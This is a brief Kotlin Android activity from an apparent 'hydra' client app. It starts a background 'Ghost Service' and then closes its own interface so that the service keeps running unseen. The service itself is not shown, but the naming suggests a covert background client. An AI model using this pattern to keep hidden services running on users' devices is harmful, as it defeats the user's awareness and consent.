package com.hydra.client

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.widget.Toast

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Start the Ghost Service
        val intent = Intent(this, HydraService::class.java)
        startService(intent)
        
        Toast.makeText(this, "Hydra Head Activated", Toast.LENGTH_SHORT).show()
        
        // Close the UI immediately - the service keeps running
        finish()
    }
}